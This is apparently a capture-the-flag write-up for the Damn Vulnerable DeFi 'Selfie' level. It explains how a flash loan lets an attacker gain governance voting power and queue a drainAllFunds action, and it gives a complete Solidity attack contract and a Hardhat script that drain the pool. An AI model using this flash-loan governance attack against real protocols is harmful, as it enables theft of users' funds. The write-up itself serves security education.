# Level 6 : Selfie

A governance, something really nice to learn in the decentralized space.. but this one is not fully secure.

Target is clear : we have to drain funds 😊

First thing that should jump on your eyes when reading contracts should be the function `drainAllFunds(address receiver)` , unfortunally it can only be executed by someone from the gouvernance … but we keep this function in mind when reading the other contract.

On the SimpleGovernance contract there is a lot of code useless for our understanding, the only things to note is that to be part of the gouvernance we have to pass the _hasEnoughVotes() function by having more than half of the total supply (maybe using a flashLoan could help for that 😛).

Then when part of the gouv, we can execute action .. interesting. To do that we can use the `queueAction()` function that takes bytes data representing a call to a function to execute after 2 days of patience (but with EVM 2 days is short we learned that on the last challenge ). This function will generate an actionId that can be submit to`executeAction(actionId)`

Here a short recap to hack it : 

1. Flash loan all the DVT available on the pool
2. Trigger a **`snapshot`** on the **`DamnValuableTokenSnapshot`** contract to be part of the gouvernance
3. Call **`queueAction`** on **`SimpleGovernance`** contract to create an action to call **`drainAllFunds`** on the pool
4. Return the DVT we have borrowed from the pool
5. Wait two days and call **`executeAction`** on the Governance contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../DamnValuableTokenSnapshot.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Snapshot.sol";
import "./SimpleGovernance.sol";
import './SelfiePool.sol';
contract AttackSelfie {
  SimpleGovernance gouv;
  SelfiePool selfiepool;
  DamnValuableTokenSnapshot dvt;
  address immutable owner;
  uint256 actionId;
  constructor(address _gouv,address _selfiepool,address _dvt) {
    gouv=SimpleGovernance(_gouv);
    selfiepool=SelfiePool(_selfiepool);
    dvt=DamnValuableTokenSnapshot(_dvt);
    owner=msg.sender;
  }
  function attack(uint256 amount) public {
    selfiepool.flashLoan(amount); // 1. Flash loan enough dvt to be authorized to queueAction
    // 2. Trigger receiveTokens()
  }
  function receiveTokens(address token,uint256 amount) public {
    require(msg.sender == address(selfiepool));
    dvt.snapshot(); //3. Create a snapshot here of our amount of DVT tokens flashloaned
    actionId = gouv.queueAction( //4. Create Action to drainAllFunds
      address(selfiepool),abi.encodeWithSignature("drainAllFunds(address)",address(owner)),0
    );
    //5. Pay Back FlashLoan
    dvt.transfer(address(selfiepool),amount);
  }
  function drainFunds() external{
    //6. Drain funds after increased time of 2 days by submitting actionId
    gouv.executeAction(actionId);
  }
}
```

```jsx
const Attacker = await ethers.getContractFactory('AttackSelfie', attacker)
this.attackerContract = await Attacker.deploy(this.governance.address,this.pool.address,this.token.address);
await this.attackerContract.connect(attacker).attack(TOKENS_IN_POOL);
await ethers.provider.send("evm_increaseTime",[2*24*60*60]);
await this.attackerContract.connect(attacker).drainFunds();
```

## Key Security Takeaways

- Using public audited contract from OpenZeppelin for Gouvernance can be good
    - [https://blog.openzeppelin.com/governor-smart-contract/](https://blog.openzeppelin.com/governor-smart-contract/)
- On-chain governance is hard, maybe using another contract to drain the funds to a trusted address can help